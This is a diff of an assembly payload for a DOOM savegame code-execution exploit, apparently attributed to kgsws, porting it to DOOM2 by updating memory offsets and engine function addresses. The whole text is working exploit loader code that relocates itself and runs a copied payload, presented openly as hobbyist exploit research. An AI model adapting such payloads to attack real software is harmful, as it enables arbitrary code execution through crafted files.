@@ -1,8 +1,8 @@
-// kgsws' DOOM code execution
+// kgsws' DOOM2 code execution
 // - this code is running from memory block allocated but already freed by ZONE
 // - this source only contains payload, you still need exploited savegame file
 //
-// %eax - pointer to players[] structure array
+// %eax - address of savebuffer variable
 // %edx - pointer to pspdef_t in player structure
 
 #define TEXT_START	0x1000
@@ -26,14 +26,14 @@ _start:
 	push	%ebp
 
 	// get _start base
-	mov	12(%ecx),%esi
-	add	$(8922-TEXT_START),%esi	// ESI will always point to local base
+	mov	(%eax),%esi
+	add	$(3322-TEXT_START),%esi	// ESI will always point to local base
 	// get DATA base
-	sub	$0x2B24C,%eax
+	sub	$0x2B3C4,%eax
 	push	%eax
 	// get CODE base
 	mov	28(%esp),%eax
-	sub	$0x2D1D5,%eax
+	sub	$0x2D095,%eax
 
 	// relocate CODE references
 	mov	$reloc_code_start,%ebx
@@ -63,7 +63,7 @@ _start:
 
 	// allocate memory for payload and its .bss
 	mov	payload_is_here(%esi),%eax
-	add	-(8946-TEXT_START)(%esi),%eax // almost savegame size (this won't be used anyway)
+	add	-(3346-TEXT_START)(%esi),%eax // almost savegame size (this won't be used anyway)
 	mov	$1,%edx	// PU_STATIC
 	xor	%ebx,%ebx // NULL
 	call	*Z_Malloc(%esi)
@@ -71,7 +71,7 @@ _start:
 	// copy the payload
 	push	%eax
 	lea	payload_is_here(%esi),%ecx
-	mov	-(8946-TEXT_START)(%esi),%ebx
+	mov	-(3346-TEXT_START)(%esi),%ebx
 	add	%eax,%ebx
 copy_loop:
 	mov	(%ecx),%edx
@@ -116,13 +116,13 @@ reloc_code_start:
 _code_base:
 	.4byte	0
 S_StopMusic:
-	.4byte	0x0003EE30
+	.4byte	0x0003EC40
 D_StartTitle:
-	.4byte	0x0001D830
+	.4byte	0x0001D810
 Z_Malloc:
-	.4byte	0x000397D0
+	.4byte	0x00039690
 Z_FreeTags:
-	.4byte	0x000398C0
+	.4byte	0x00039780
 //
 reloc_code_end:
 
@@ -133,9 +133,9 @@ reloc_data_start:
 _data_base:
 	.4byte	0
 gamestate:
-	.4byte	0x0002B7C8
+	.4byte	0x0002B3F4
 wipegamestate:
-	.4byte	0x00011B44
+	.4byte	0x00011B40
 //
 reloc_data_end:
 
